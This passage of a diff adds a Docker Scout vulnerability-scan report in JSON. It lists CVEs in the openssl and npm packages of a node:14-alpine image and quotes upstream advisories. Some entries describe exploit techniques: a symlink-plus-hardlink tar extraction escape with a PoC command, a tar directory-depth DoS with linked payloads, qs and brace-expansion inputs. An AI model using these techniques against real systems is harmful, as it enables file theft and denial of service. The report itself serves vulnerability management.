+          "url": "https://scout.docker.com/v/CVE-2023-6237?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r3"
+        }
+      ]
+    },
+    {
+      "id": "d9a040f234efb1567de41c7de61716b436e2f46a0a23ec8619041d1303adf959",
+      "category": "container_scanning",
+      "message": "CVE-2024-2511 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2024-2511",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.12-r5",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2024-2511",
+          "value": "CVE-2024-2511",
+          "url": "https://scout.docker.com/v/CVE-2024-2511?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r5"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2024-2511?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r5"
+        }
+      ]
+    },
+    {
+      "id": "16a0a07e6f165b250238ea1c0d510e3ddc56bfd174424eaa9a53c24eeffbfb18",
+      "category": "container_scanning",
+      "message": "CVE-2025-9232 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2025-9232",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.19-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-9232",
+          "value": "CVE-2025-9232",
+          "url": "https://scout.docker.com/v/CVE-2025-9232?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-9232?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ]
+    },
+    {
+      "id": "597e9e31011d0ccc9634825bb0efce98d3247c327826d5081cb4c921a6fe7a6f",
+      "category": "container_scanning",
+      "message": "CVE-2023-28155 on request@2.88.2",
+      "description": "The `request` package through 2.88.2 for Node.js and the `@cypress/request` package prior to 3.0.0 allow a bypass of SSRF mitigations via an attacker-controller server that does a cross-protocol redirect (HTTP to HTTPS, or HTTPS to HTTP).\n\nNOTE: The `request` package is no longer supported by the maintainer.",
+      "cve": "CVE-2023-28155",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/request@2.88.2"
+          },
+          "version": "2.88.2"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-28155",
+          "value": "CVE-2023-28155",
+          "url": "https://scout.docker.com/v/CVE-2023-28155?s=github&n=request&t=npm&vr=%3C%3D2.88.2"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-28155?s=github&n=request&t=npm&vr=%3C%3D2.88.2"
+        }
+      ]
+    },
+    {
+      "id": "057e53351e4940b7dedd8dc18fecc64ed6a7c08fc9d36fc02183406195b6934c",
+      "category": "container_scanning",
+      "message": "CVE-2025-15284 on qs@6.5.3",
+      "description": "### Summary\n\nThe `arrayLimit` option in qs did not enforce limits for bracket notation (`a[]=1&a[]=2`), only for indexed notation (`a[0]=1`). This is a consistency bug; `arrayLimit` should apply uniformly across all array notations.\n\n**Note:** The default `parameterLimit` of 1000 effectively mitigates the DoS scenario originally described. With default options, bracket notation cannot produce arrays larger than `parameterLimit` regardless of `arrayLimit`, because each `a[]=value` consumes one parameter slot. The severity has been reduced accordingly.\n\n### Details\n\nThe `arrayLimit` option only checked limits for indexed notation (`a[0]=1&a[1]=2`) but did not enforce it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Note on parameterLimit interaction:** The original advisory's \"DoS demonstration\" claimed a length of 10,000, but `parameterLimit` (default: 1000) caps parsing to 1,000 parameters. With default options, the actual output is 1,000, not 10,000.\n\n### Impact\n\nConsistency bug in `arrayLimit` enforcement. With default `parameterLimit`, the practical DoS risk is negligible since `parameterLimit` already caps the total number of parsed parameters (and thus array elements from bracket notation). The risk increases only when `parameterLimit` is explicitly set to a very high value.",
+      "cve": "CVE-2025-15284",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade qs@6.5.3 to 6.14.1",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/qs@6.5.3"
+          },
+          "version": "6.5.3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-15284",
+          "value": "CVE-2025-15284",
+          "url": "https://scout.docker.com/v/CVE-2025-15284?s=github&n=qs&t=npm&vr=%3C6.14.1"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-15284?s=github&n=qs&t=npm&vr=%3C6.14.1"
+        }
+      ]
+    },
+    {
+      "id": "0d087436550d0c3494746de18b67a355289f94ca9253e07cd87d957f339676cb",
+      "category": "container_scanning",
+      "message": "CVE-2023-26136 on tough-cookie@2.5.0",
+      "description": "Versions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in `rejectPublicSuffixes=false` mode. This issue arises from the manner in which the objects are initialized.",
+      "cve": "CVE-2023-26136",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade tough-cookie@2.5.0 to 4.1.3",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/tough-cookie@2.5.0"
+          },
+          "version": "2.5.0"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-26136",
+          "value": "CVE-2023-26136",
+          "url": "https://scout.docker.com/v/CVE-2023-26136?s=github&n=tough-cookie&t=npm&vr=%3C4.1.3"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-26136?s=github&n=tough-cookie&t=npm&vr=%3C4.1.3"
+        }
+      ]
+    },
+    {
+      "id": "65fc74f11737423e211b1af4b0d1614ab22c2ff90ebb3fe09f813df8ce268e41",
+      "category": "container_scanning",
+      "message": "CVE-2023-2650 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2023-2650",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.9-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-2650",
+          "value": "CVE-2023-2650",
+          "url": "https://scout.docker.com/v/CVE-2023-2650?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.9-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-2650?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.9-r0"
+        }
+      ]
+    },
+    {
+      "id": "9c630c2fdfabe46c2bbf90c54ad3b6e502c008e6a7fa97fa851c103625b25050",
+      "category": "container_scanning",
+      "message": "CVE-2023-6129 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2023-6129",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.12-r2",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-6129",
+          "value": "CVE-2023-6129",
+          "url": "https://scout.docker.com/v/CVE-2023-6129?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r2"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-6129?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r2"
+        }
+      ]
+    },
+    {
+      "id": "ab92b230667e7116fdb379982aa2e3df7bef9458473c02b5fd01b0258a41817f",
+      "category": "container_scanning",
+      "message": "CVE-2024-28863 on tar@4.4.19",
+      "description": "## Description: \nDuring some analysis today on npm's `node-tar` package I came across the folder creation process, Basicly if you provide node-tar with a path like this `./a/b/c/foo.txt` it would create every folder and sub-folder here a, b and c until it reaches the last folder to create `foo.txt`, In-this case I noticed that there's no validation at all on the amount of folders being created, that said we're actually able to CPU and memory consume the system running node-tar and even crash the nodejs client within few seconds of running it using a path with too many sub-folders inside\n\n## Steps To Reproduce:\nYou can reproduce this issue by downloading the tar file I provided in the resources and using node-tar to extract it, you should get the same behavior as the video\n\n## Proof Of Concept:\nHere's a [video](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3i7uojw8s52psar6pg8zkdo4h9io?response-content-disposition=attachment%3B%20filename%3D%22tar-dos-poc.webm%22%3B%20filename%2A%3DUTF-8%27%27tar-dos-poc.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1e8235d885f1d61529b7d6b23ea3a0780c300c91d86e925dd8310d5b661ddbe2) show-casing the exploit: \n\n## Impact\n\nDenial of service by crashing the nodejs client when attempting to parse a tar archive, make it run out of heap memory and consuming server CPU and memory resources\n\n## Report resources\n[payload.txt](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1e83ayb5dd3350fvj3gst0mqixwk?response-content-disposition=attachment%3B%20filename%3D%22payload.txt%22%3B%20filename%2A%3DUTF-8%27%27payload.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bad9fe731f05a63a950f99828125653a8c1254750fe0ca7be882e89ecdd449ae)\n[archeive.tar.gz](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ymkuh4xnfdcf1soeyi7jc2x4yt2i?response-content-disposition=attachment%3B%20filename%3D%22archive.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27archive.tar.gz&response-content-type=application%2Fx-tar&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5e2c0d4b4de40373ac0fe91908c2659141a6dd4ab850271cc26042a3885c82ea)\n\n## Note\nThis report was originally reported to GitHub bug bounty program, they asked me to report it to you a month ago",
+      "cve": "CVE-2024-28863",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade tar@4.4.19 to 6.2.1",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/tar@4.4.19"
+          },
+          "version": "4.4.19"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2024-28863",
+          "value": "CVE-2024-28863",
+          "url": "https://scout.docker.com/v/CVE-2024-28863?s=github&n=tar&t=npm&vr=%3C6.2.1"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2024-28863?s=github&n=tar&t=npm&vr=%3C6.2.1"
+        }
+      ]
+    },
+    {
+      "id": "aada7902835cd362a63788360bb2ef85dd775f6b89f3e8612adaba87bc2b3b8d",
+      "category": "container_scanning",
+      "message": "CVE-2026-33750 on brace-expansion@1.1.11",
+      "description": "### Impact\n\nA brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.\n\nThe loop in question:\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184\n\n`test()` is one of\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113\n\nThe increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.\n\nThis affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.\n\n### Patches\n\n\nUpgrade to versions\n- 5.0.5+\n\nA step increment of 0 is now sanitized to 1, which matches bash behavior.\n\n### Workarounds\n\nSanitize strings passed to `expand()` to ensure a step value of `0` is not used.",
+      "cve": "CVE-2026-33750",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade brace-expansion@1.1.11 to 5.0.5",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/brace-expansion@1.1.11"
+          },
+          "version": "1.1.11"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-33750",
+          "value": "CVE-2026-33750",
+          "url": "https://scout.docker.com/v/CVE-2026-33750?s=github&n=brace-expansion&t=npm&vr=%3C1.1.13"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-33750?s=github&n=brace-expansion&t=npm&vr=%3C1.1.13"
+        }
+      ]
+    },
+    {
+      "id": "1ac32231a4d358153b909a2ab6349bed37c49c26fe53cdda262b36330f39dd01",
+      "category": "container_scanning",
+      "message": "CVE-2026-26960 on tar@4.4.19",
+      "description": "### Summary\n`tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options.\n\nThis enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`).\n\nSeverity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive.\n\n### Details\nThe bypass chain uses two symlinks plus one hardlink:\n\n1. `a/b/c/up -> ../..`\n2. `a/b/escape -> c/up/../..`\n3. `exfil` (hardlink) -> `a/b/escape/<target-relative-to-parent-of-extract>`\n\nWhy this works:\n\n- Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety.\n  - See `STRIPABSOLUTEPATH` logic in:\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281`\n\n- Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`.\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:566`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:567`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:703`\n\n- Parent directory safety checks (`mkdir` + symlink detection) are applied to the destination path of the extracted entry, not to the resolved hardlink target path.\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:617`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:619`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:27`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:101`\n\nAs a result, `exfil` is created inside extraction root but linked to an external file. The PoC confirms shared inode and successful read+write via `exfil`.\n\n### PoC\n[hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js)\nEnvironment used for validation:\n\n- Node: `v25.4.0`\n- tar: `7.5.7`\n- OS: macOS Darwin 25.2.0\n- Extract options: defaults (`tar.extract({ file, cwd })`)\n\nSteps:\n\n1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory.\n\n2. Run:\n\n```bash\nTAR_MODULE=\"$(cd '../tar-audit-setuid - CVE/node_modules/tar' && pwd)\" node hardlink.js\n```\n\n3. Expected vulnerable output (key lines):\n\n```text\nsame_inode=true\nread_ok=true\nwrite_ok=true\nresult=VULNERABLE\n```\n\nInterpretation:\n\n- `same_inode=true`: extracted `exfil` and external secret are the same file object.\n- `read_ok=true`: reading `exfil` leaks external content.\n- `write_ok=true`: writing `exfil` modifies external file.\n\n### Impact\nVulnerability type:\n\n- Arbitrary file read/write via archive extraction path confusion and link resolution.\n\nWho is impacted:\n\n- Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults.\n- Impact scope is the privileges of the extracting process user.\n\nPotential outcomes:\n\n- Read sensitive files reachable by the process user.\n- Overwrite writable files outside extraction root.\n- Escalate impact depending on deployment context (keys, configs, scripts, app data).",
+      "cve": "CVE-2026-26960",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade tar@4.4.19 to 7.5.8",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/tar@4.4.19"
+          },
+          "version": "4.4.19"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-26960",
+          "value": "CVE-2026-26960",
+          "url": "https://scout.docker.com/v/CVE-2026-26960?s=github&n=tar&t=npm&vr=%3C7.5.8"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-26960?s=github&n=tar&t=npm&vr=%3C7.5.8"
+        }
+      ]
+    },
+    {
+      "id": "4207835518fd73e41e91dadb018f05ae332341c8353e3a97dd0087672a277502",
+      "category": "container_scanning",
+      "message": "CVE-2025-69419 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2025-69419",
+      "severity": "High",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.19-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-69419",
+          "value": "CVE-2025-69419",
+          "url": "https://scout.docker.com/v/CVE-2025-69419?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-69419?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ]
+    },
+    {
+      "id": "9a472637dfae5ab62b6634ab761c21c2aafd2d7c56bee3c1fecc59e293b39eea",
+      "category": "container_scanning",
+      "message": "CVE-2021-3807 on ansi-regex@4.1.0",
